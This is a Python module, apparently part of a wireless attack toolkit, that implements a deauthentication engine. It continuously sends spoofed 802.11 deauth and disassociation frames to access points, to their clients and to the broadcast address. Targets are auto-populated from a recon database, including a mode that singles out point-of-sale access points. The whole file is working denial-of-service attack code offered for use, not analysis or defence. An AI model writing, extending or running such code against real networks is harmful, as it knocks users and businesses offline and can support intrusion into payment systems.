"""
Deauthentication Engine
───────────────────────
Sends targeted deauth/disassoc frames in three directions:
  1. AP -> Client (spoofed as AP)
  2. Client -> AP (spoofed as client)
  3. AP -> Broadcast (mass disconnect)

Targets are populated from the recon database — no manual input needed.

Performance: uses native C packet crafting/sending when available,
falls back to scapy sendp() if the native module is not compiled.
"""

import time
import threading
from collections import defaultdict

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, RadioTap

from .config import (
    DEAUTH_BURST_COUNT, DEAUTH_BURST_INTERVAL, WIFI_BROADCAST, log,
)

# ─── Native C acceleration (optional) ────────────────────────────────────────
try:
    from .native.packet_engine import RawSocket
    from .native.deauth_craft import (
        craft_deauth, craft_disassoc, deauth_target, deauth_broadcast,
    )
    _HAS_NATIVE = True
    log.debug("Deauth engine: native C acceleration loaded")
except ImportError:
    _HAS_NATIVE = False
    log.debug("Deauth engine: native C not available, using scapy fallback")


class DeauthEngine:
    """
    Deauth attack engine that automatically targets BSSIDs and their clients
    using data from the recon scanner's database.
    """

    def __init__(self, interface, verify_callback=None):
        self.interface = interface
        self.running = False
        self._targets = defaultdict(set)  # bssid -> {client_mac, ...}
        self._thread = None
        self.verify_callback = verify_callback

    def add_target(self, bssid, clients=None):
        """Add a BSSID and its known clients as deauth targets."""
        if clients:
            self._targets[bssid].update(clients)
        else:
            self._targets[bssid]

    def add_targets_from_db(self, db):
        """
        Auto-populate targets from recon database.
        Pulls all APs and their associated clients.
        """
        ap_clients = db.get_all_ap_clients()
        for bssid, clients in ap_clients.items():
            self._targets[bssid].update(clients)
        log.info(f"Deauth auto-target: {len(self._targets)} APs, "
                 f"{sum(len(c) for c in self._targets.values())} clients")

    def add_pos_targets_from_db(self, db):
        """
        Auto-populate targets with POS APs only (surgical targeting).
        """
        pos_aps = db.get_pos_access_points()
        for row in pos_aps:
            bssid = row[0]
            clients = db.get_clients_for_bssid(bssid)
            # get_clients_for_bssid returns [(mac, rssi), ...] tuples
            self._targets[bssid].update(mac for mac, rssi in clients)
        log.info(f"Deauth POS-target: {len(self._targets)} POS APs")

    def remove_target(self, bssid):
        self._targets.pop(bssid, None)

    def _craft_deauth(self, sender, receiver, bssid):
        deauth = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid) /
            Dot11Deauth(reason=7)
        )
        disassoc = (
            RadioTap() /
            Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid) /
            Dot11Disas(reason=8)
        )
        return [deauth, disassoc]

    def _send_native(self, raw_sock, sender, receiver, bssid, count):
        """Send deauth + disassoc burst using native C raw socket."""
        for _ in range(count):
            deauth_frame = craft_deauth(sender, receiver, bssid, reason=7)
            disassoc_frame = craft_disassoc(sender, receiver, bssid, reason=8)
            raw_sock.send(deauth_frame)
            raw_sock.send(disassoc_frame)

    def _deauth_loop(self):
        # Open native raw socket if available
        raw_sock = None
        if _HAS_NATIVE:
            try:
                raw_sock = RawSocket(self.interface)
                log.info("Deauth engine: using native C raw socket")
            except Exception as e:
                log.warning(f"Native raw socket failed ({e}), falling back to scapy")
                raw_sock = None

        while self.running:
            try:
                for bssid, clients in list(self._targets.items()):
                    if raw_sock:
                        # ── Native C fast path ──
                        # Broadcast deauth
                        try:
                            deauth_broadcast(raw_sock, bssid, DEAUTH_BURST_COUNT)
                        except Exception as e:
                            log.error(f"Native broadcast deauth failed for {bssid}: {e}")
                        # Per-client targeted (both directions)
                        for client_mac in list(clients):
                            try:
                                deauth_target(raw_sock, bssid, client_mac, DEAUTH_BURST_COUNT)
                            except Exception as e:
                                log.error(f"Native deauth failed for {client_mac}: {e}")
                            # Optionally verify deauth effectiveness
                            if self.verify_callback:
                                try:
                                    self.verify_callback(bssid, client_mac)
                                except Exception as e:
                                    log.debug(f"Deauth verify callback error: {e}")
                    else:
                        # ── Scapy fallback path (batched) ──
                        # Collect all frames for this cycle then send as batch
                        batch_frames = []

                        # Broadcast deauth (hits all clients)
                        batch_frames.extend(
                            self._craft_deauth(bssid, WIFI_BROADCAST, bssid))

                        # Per-client targeted deauth (3-way)
                        for client_mac in list(clients):
                            batch_frames.extend(
                                self._craft_deauth(bssid, client_mac, bssid))
                            batch_frames.extend(
                                self._craft_deauth(client_mac, bssid, bssid))

                        # Send entire batch at once
                        if batch_frames:
                            try:
                                sendp(batch_frames, iface=self.interface,
                                      count=DEAUTH_BURST_COUNT, inter=0.02,
                                      verbose=False)
                            except Exception as e:
                                log.error(f"Deauth batch send failed for {bssid}: {e}")

                        # Run verify callbacks after the batch
                        if self.verify_callback:
                            for client_mac in list(clients):
                                try:
                                    self.verify_callback(bssid, client_mac)
                                except Exception as e:
                                    log.debug(f"Deauth verify callback error: {e}")
                time.sleep(DEAUTH_BURST_INTERVAL)
            except Exception as e:
                log.error(f"Deauth loop error: {e}")
                if not self.running:
                    break
                time.sleep(1)  # Prevent tight error loop

        # Cleanup native socket
        if raw_sock:
            try:
                raw_sock.close()
            except Exception:
                pass

    def start(self):
        if self.running:
            return
        if not self._targets:
            log.warning("Deauth engine has no targets")
            return
        self.running = True
        self._thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self._thread.start()
        log.info(f"Deauth engine started: {len(self._targets)} BSSIDs")

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info("Deauth engine stopped")
